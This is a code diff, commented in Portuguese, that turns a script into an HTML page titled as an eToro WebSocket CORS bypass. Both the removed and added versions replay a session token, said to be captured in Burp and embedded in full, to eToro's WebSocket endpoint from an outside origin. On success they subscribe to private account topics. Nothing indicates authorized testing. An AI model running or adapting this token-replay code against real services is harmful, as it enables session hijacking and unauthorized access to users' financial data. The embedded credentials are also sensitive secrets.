@@ -1,47 +1,71 @@
-// TOKEN CAPTURADO NO BURP - É O MESMO DO DEVICELOGINDATA
-const WS_TOKEN = "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwia2lkIjoiMjg0OTgiLCJ0eXAiOiJKV1QiLCJjdHkiOiJKV1QifQ..xUHCEgjCQ8ILl7-vFlOMRw.ZrHYolrianC2abTrnC-bHE5qeAsyKE4qXP_amX_T5HKjZOA1KYFOc9Z2Rm3XDHlbrLgAucceT7xmG8ukjikJ7rlJoDkVlJc1iYbxtbsxKtQs-v4ABpQXnFSYsbzSBYrA2csMKVyixBTEeOECbZ95ciKs5c4rvVkHP0KFQyi0lPwCXrrSXLva3tVuVwkY9e07ikwrnTDQ1NdEk31z6qYy7IRDFa7RlZO6hxijC3r1TAO0dCgMcOxKmfqslwWanwePPmR58KMH4QumAncSvVvtAYh0YH66yKj-KqYnjW44x9asonzXIcsE8INcS7pGacuQQKl1vrlqafZEFO5s_VKs4-Ur8rRVohh3S1e1y7YZAwH-yiJWpPnKUhTZTh_CyOKKCQVm8GC3C_C3-BykcfarEU2FgpAicKXFI2BIbSk1d4l8ycyMGRLFH7m_hnKoyaZlwIAMPu-tj38V-fAXAXoASLJ74NpnZy_I2l6_MaIU1x7I7OFswnBnuB7qh2RmDOMBrn2wsxRaepkCkrPngv24pPGgCBWF7wJVkc01O_PhEvYh3fT7H_Eso05GL3CCj0OmkN_YVl8mStHPu2dMIV9dljV2yhn49XYpfVJNFNeQb1cZAyhf1_eCCgLILYxhYPQIbLfMM66xITBgD-iAm1y46_HSYaAaXlt71a6wXpG4iiwnDBzIYDC1GibluYks_6eXPFUg23JJeU5oILvdAZD5z_M5MFrAz7iylS2YzV5MdAen6OpkkWHOcfU-0d4i2zq-HAl0aaCzWMOwMnvPem3hhLsbac0g0buhtV81VB4cYbMstMSBCJVtMUJ4t3vFP0rPFznxWFtBS-Bc3ymoFTZRuFEwQj8QOpV5lojOHSgXuzyIqUp6xEyt32l_vIhMv7U1NA2DQRKHX9ZXBT7wudEG5_hA5sMh3zFR9REOUly1Qe-lCdSXIfMpUPQWUNltgg-e35hjOWVqH9NGbm9nl59IZhSGaYZ7kezc3sl2vhECedOGU0Jhaj4QZGcVfflPf7iIBbzQ0zx8CEsvrr3BGRPMjW-fQbAnzPKh0O0u3k7WW1P_scKZZIFCT0kqVYkKWgDv-XHsphcsqHA6rQeauB1apTfRiJpYZAl_wmgPr8zLPgo-AoaIVTa2yD3o9KiSxkiyxBeYX4f4v6oei7McKuywzcxbxSl4lBP274k3Z-NkQcqvcMwQmqooNvPIn_9TpGd3RNJZWdV8GUg37z57Oq27ORuLnXH2HW1dPqIsM9RniA-4ZbJkf77ergKuctRyKdAb7P9lEnqSzYScuhKhirJsj-A0j7__ok2vKc04nOeIJrD8wBajufrJuid9xoaOj5J8o7VrHGXbrdyxErZD-ns7ht5L_sqozs2iiLH41zzB9iNl2ov4OkT7iqim4dVnDfTJmUPq0R8XHTU0_N2-I2pyu1oNkwArvoPIOIpmMf0JOLRG7hA_4jcmH5_HF9cvM52xxNVWMmze1RRH_kIkwHCh2zV7lD8pEZBJHzEaPAEexnrhQi9nRdsRg64SnSXV1Ro8NDdez9An9He7UWA92J82HzOcGdYvxTjYHHGHhdgkz_g.2iwz1FJNU2nSt8jipbQ_6rmyxheqFXkN07G-XZ8hd9M";
-
-console.log('🚀 TESTANDO TOKEN DO WEBSOCKET DO GITHUB PAGES');
-console.log('📍 Origem:', window.location.origin);
-console.log('🔑 Token tamanho:', WS_TOKEN.length);
-
-const ws = new WebSocket("wss://ws.etoro.com/ws");
-
-ws.onopen = () => {
-    console.log('✅ CONEXÃO ESTABELECIDA DE ORIGEM EXTERNA!');
+<!DOCTYPE html>
+<html>
+<head>
+    <title>eToro WebSocket - CORS Bypass</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>eToro WebSocket - Tentativa de Bypass</h1>
+    <div id="logs"></div>
     
-    // Usa o MESMO formato que o Burp capturou
-    ws.send(JSON.stringify({
-        id: crypto.randomUUID(),
-        operation: "Authenticate",
-        data: {
-            userKey: WS_TOKEN,
-            apiKey: WS_TOKEN
+    <script>
+        // Usando um proxy CORS para WebSocket (se existir)
+        // Infelizmente, WebSocket não pode ser proxyado facilmente via CORS
+        
+        const logDiv = document.getElementById('logs');
+        
+        function addLog(msg) {
+            const p = document.createElement('div');
+            p.textContent = new Date().toLocaleTimeString() + ' - ' + msg;
+            logDiv.appendChild(p);
+            console.log(msg);
         }
-    }));
-    console.log('📤 Mensagem de autenticação enviada');
-};
-
-ws.onmessage = async (event) => {
-    let data = event.data;
-    if (data instanceof Blob) data = await data.text();
-    console.log('📥 RESPOSTA:', data);
-    
-    try {
-        const resp = JSON.parse(data);
-        if (resp.success === true) {
-            console.log('🔥🔥🔥 AUTENTICADO COM SUCESSO! 🔥🔥🔥');
-            console.log('✅ O TOKEN FUNCIONA DE ORIGEM EXTERNA!');
+        
+        // Estratégia 1: Tentar com diferentes formatos de token
+        const TOKEN = "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwia2lkIjoiMjg0OTgiLCJ0eXAiOiJKV1QiLCJjdHkiOiJKV1QifQ..FBpl0RFd2cMPGmUvuFZ9SQ.vEF-1JOcuT_YHdbPCBfCvK9FO-XwD_x4c73xZD1Dwjek1bTtCUc9TmLzWQJYip7CEMh5DvWL9qj9M8YOocE8COoHFseqKZAgicIrgN0YqkMhfVXnGqtJogc-ZihXGMLxGhoolSITLy7mclGbhdfkdeLx-wUnYBs9glnr54QnlR_hx7BQ6Kt7uHNbcZ3q77h4JXT1ePXDZqnfdbEJSTuGvJk4g5ZqWmUGchXBSbDqpj_qJoj1ncHZ6mIuk8VyyfbbBEYn3YqSDhQLkLNn6atl7iTII330XfTfdddJpDYVufh97qgzsZKmsNRYEAZmh2lfSiEpi3n9giD_NJxJ8HDICWnnhNmSvX9cwagwdFjLpOcSu6TDaNsAtcmOCtdbH8_2BWrK8rbk40cDK1C1tXR3MQ.mFqpvm7ylgDINxR0Ewu_M7-OCOIko9fQske0z3wDakk";
+        
+        addLog('🚀 Iniciando tentativas de bypass');
+        addLog('📍 Origem: ' + window.location.origin);
+        
+        // Tentativa 1: WebSocket normal (já sabemos que falha na auth)
+        const ws = new WebSocket("wss://ws.etoro.com/ws");
+        
+        ws.onopen = () => {
+            addLog('✅ Conexão WebSocket estabelecida');
+            addLog('📤 Enviando autenticação com accessToken');
             
-            // Tenta acessar dados
             ws.send(JSON.stringify({
                 id: crypto.randomUUID(),
-                operation: "Subscribe",
-                data: { topics: ["private"], snapshot: true }
+                operation: "Authenticate",
+                data: { accessToken: TOKEN }
             }));
-        }
-    } catch(e) {}
-};
-
-ws.onerror = (e) => console.log('❌ Erro:', e);
-ws.onclose = (e) => console.log(`🔌 Fechado: ${e.code}`);
+        };
+        
+        ws.onmessage = async (event) => {
+            let data = event.data;
+            if (data instanceof Blob) data = await data.text();
+            addLog('📥 Resposta: ' + data);
+            
+            try {
+                const resp = JSON.parse(data);
+                if (resp.success === true) {
+                    addLog('🔥 SUCESSO! Autenticado!');
+                    // Tenta acessar dados
+                    ws.send(JSON.stringify({
+                        id: crypto.randomUUID(),
+                        operation: "Subscribe",
+                        data: { topics: ["private"], snapshot: true }
+                    }));
+                }
+            } catch(e) {}
+        };
+        
+        ws.onclose = (event) => {
+            addLog(`🔌 Conexão fechada: ${event.code}`);
+            if (event.code === 1006) {
+                addLog('⚠️ Falha na autenticação - servidor rejeitou o token/Origin');
+            }
+        };
+    </script>
+</body>
+</html>
